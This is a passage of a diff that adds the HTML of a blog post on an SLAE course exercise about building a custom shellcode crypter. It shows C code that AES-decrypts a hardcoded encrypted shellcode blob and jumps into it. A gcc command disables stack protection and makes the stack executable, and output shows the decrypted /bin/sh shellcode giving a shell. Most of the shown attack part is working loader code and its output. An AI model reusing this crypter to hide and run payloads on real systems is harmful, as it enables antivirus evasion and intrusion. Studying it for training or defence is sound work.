+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"01234567890123456"</span><span class="p">;</span>
+
+  <span class="cm">/* Shellcode to be decrypted */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span> <span class="o">=</span>
+                <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"</span><span class="se">\x47\xfe\x57\xcc\x1f\xd0\x4a\xf5\x34\x3e\x92\x8c\x9e\xc5\x05\x3d\xc0\xc6\x94\x48\x43\x0a\xb3\x62\xc2\x49\xef\x1d\x8b\x6a\x5e\x39\xf8\xb4\xd4\x29\xa1\x09\xfc\x99\x61\xa2\x2d\xa2\xc9\x81\x1a\x81\x9e\x3c\xf9\x7d\xb1\x3e\x5f\xde\xce\xfe\x5e\x9d\xf0\xd6\x7b\x0e</span><span class="s">"</span><span class="p">;</span>
+
+  <span class="cm">/* Buffer for the decrypted text */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">decryptedtext</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+  <span class="kt">int</span> <span class="n">decryptedtext_len</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">;</span>
+
+  <span class="cm">/* Initialise the library */</span>
+  <span class="n">ERR_load_crypto_strings</span><span class="p">();</span>
+  <span class="n">OpenSSL_add_all_algorithms</span><span class="p">();</span>
+  <span class="n">OPENSSL_config</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ciphertext</span><span class="p">);</span>
+
+  <span class="cm">/* Decrypt the ciphertext */</span>
+  <span class="n">decryptedtext_len</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span>
+    <span class="n">decryptedtext</span><span class="p">);</span>
+
+  <span class="n">decryptedtext</span><span class="p">[</span><span class="n">decryptedtext_len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+
+
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">decryptedtext</span><span class="p">;</span>
+
+  <span class="n">ret</span><span class="p">();</span>
+
+  <span class="cm">/* Clean up */</span>
+  <span class="n">EVP_cleanup</span><span class="p">();</span>
+  <span class="n">ERR_free_strings</span><span class="p">();</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\"\n\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>When we compile this program we need to ensure once again that we link
+the openssl library as well as disable stack protection and make the
+stack executable:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gcc aesdecrypt.c -o aesdecrypt -lcrypto -fno-stack-protector -z execstack</code></pre></figure>
+
+<p>Perfect. Now for the moment of truth…</p>
+
+<h2 id="the-execution">The Execution</h2>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>./aesdecrypt
+<span class="gp">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>someuser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>someuser<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>someuser<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lpadmin<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,999<span class="o">(</span>vboxsf<span class="o">)</span></code></pre></figure>
+
+<p>It works! We see that our original <code class="highlighter-rouge">execve /bin/sh</code> shellcode has
+executed and we can run commands on our shell as expected.</p>
+
+          </div>
+
+          <div class="article-share">
+            
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 7: Create a Custom Crypter - http://localhost:4000/posts/slae-problem-7-custom-crypter by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+              <span class="icon icon-social-twitter"></span>
+            </a>
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-7-custom-crypter', 'newwindow', 'width=500, height=500'); return false;">
+              <span class="icon icon-social-facebook"></span>
+            </a>
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-7-custom-crypter', 'newwindow', 'width=550, height=400'); return false;">
+              <span class="icon icon-social-googleplus"></span>
+            </a>
+          </div>
+
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          
+        </article>
+        <footer class="footer reveal">
+  <p>
+    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  <script type="text/javascript" src="/assets/vendor.js"></script>
+<script type="text/javascript" src="/assets/application.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
+<script>
+  WebFont.load({
+    google: {
+      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
+    }
+  });
+</script>
+
+
+  <script>
+    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
+    ga('create','UA-4121143-2','auto');ga('send','pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+
+</body>
+</html>
